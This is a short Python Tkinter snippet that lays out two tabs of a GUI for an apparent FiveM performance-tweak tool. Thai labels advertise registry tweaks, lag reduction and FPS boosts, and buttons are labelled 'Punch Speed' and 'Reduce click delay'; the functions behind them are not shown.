Label(tab1,text="เพื่อให้ผู้เล่นที่คลั่งไคล้ในการใช้ Registry Editor แปลกใหม่ในวงการ Fivem",font=180).pack()
Label(tab1,text="ซึ่งผมเองก็เป็นคนคนหนึ่งที่ชอบการเขียนโปรแกรมเว็บไซต์แล้วเห็นว่าแปลกใหม่ดี",font=180).pack()
Label(tab1,text="เลยจะมาลองทำขายเพื่อนๆดูครับ",font=180).pack()
Label(tab1,text="คุณสมบัติของตัวโปรแกรม",font=250).pack()
Label(tab1,text="ลดหน่วง เพื่ม Fps บูทเน็ต ปรับดีเลย์เมาส์คีย์บอร์ดการปรับสภาพเครื่องให้ลื่น",font=180).pack()
Label(tab1,text="มี .meta ให้ใช้ลดหน่วงเต็มสูบ มีการปรับลดดีเลย์ทำให้เกาะแตกง่ายขึ้น",font=180).pack()
Label(tab1,text="พบเจอบัคกรุณาติดต่อ",font=250).pack()
Button(tab1,text="Discord",command=bugtalk).pack()

Label(tab2,text="Hardcore Mode Punch",font=300).pack()
Button(tab2,text="Punch performance",command=Hardcore1).pack()
Button(tab2,text="Punch Speed",command=Hardcore2).pack()
Button(tab2,text="Reduce click delay",command=Hardcore3).pack()
Button(tab2,text="No losing bet",command=Hardcore4).pack()
Button(tab2,text="Flow real punch",command=Hardcore5).pack()


lobby.mainloop()